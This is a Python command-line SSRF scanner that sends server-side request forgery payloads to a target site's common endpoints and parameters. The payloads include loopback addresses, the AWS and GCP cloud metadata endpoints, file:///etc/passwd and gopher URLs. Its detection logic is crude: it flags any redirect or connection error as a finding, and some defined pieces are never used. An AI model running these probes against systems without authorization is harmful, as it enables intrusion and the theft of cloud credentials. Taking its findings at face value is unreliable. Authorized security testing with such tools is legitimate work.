#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Scanner
Detects potential SSRF vulnerabilities
"""

import requests
import sys
import argparse
import warnings
warnings.filterwarnings('ignore')

BURPULLBACK = "http://burpcollaborator.net"
INTERNAL = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://metadata.google.internal"]
PAYLOADS = [
    ("{url}", "url param"),
    ("http://localhost", "localhost"),
    ("http://127.0.0.1", "loopback"),
    ("http://169.254.169.254", "aws metadata"),
    ("http://metadata.google.internal", "gcp metadata"),
    ("file:///etc/passwd", "file protocol"),
    ("gopher://localhost", "gopher"),
]

def check_ssrf(url, payload):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get(url, params={'url': payload}, timeout=10, verify=False, headers=headers)
        if 'localhost' in r.text.lower() or '169.254' in r.text:
            return True
    except Exception as e:
        if 'connection' in str(e).lower():
            return True
    return False

def scan(target):
    print(f"[*] SSRF Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    VulnPaths = ['/api/fetch', '/api/url', '/api/proxy', '/fetch', '/url', '/load', '/proxy', '/api/redirect']
    found = []
    
    for path in VulnPaths:
        url = target + path
        print(f"[*] Testing {url}")
        
        for payload, ptype in PAYLOADS:
            try:
                r = requests.get(url, params={'url': payload}, timeout=10, verify=False)
                resp = r.text.lower()
                
                if 'localhost' in resp or '127.0.0.1' in resp or '169.254' in resp or 'metadata' in resp:
                    print(f"[!] VULN: {url} ({ptype})")
                    found.append({'url': url, 'type': ptype})
                elif r.status_code == 301 or r.status_code == 302:
                    print(f"[!] Possible SSRF: {url} -> redirect")
                    found.append({'url': url, 'type': 'redirect'})
            except:
                pass
    
    # Test common params
    print("[*] Testing parameters...")
    params = ['url', 'uri', 'link', 'src', 'source', 'destination', 'redirect', 'next', 'data', 'reference', 'site', 'html', 'val', 'validate', 'domain', 'callback', 'return', 'page', 'feed', 'host', 'port', 'to', 'out', 'view', 'dir', 'show', 'navigation', 'open', 'file', 'document', 'folder', 'pg', 'style', 'doc', 'img', 'filename']
    
    for param in params:
        try:
            for payload, ptype in [("http://localhost", "localhost"), ("http://127.0.0.1", "loopback")]:
                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
                if 'localhost' in r.text or '127.0.0.1' in r.text:
                    print(f"[!] VULN: Parameter '{param}' ({ptype})")
                    found.append({'param': param, 'type': ptype})
        except:
            pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential SSRF issues")
        for f in found:
            print(f"  - {f}")
    else:
        print("[*] No SSRF vulnerabilities detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SSRF Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)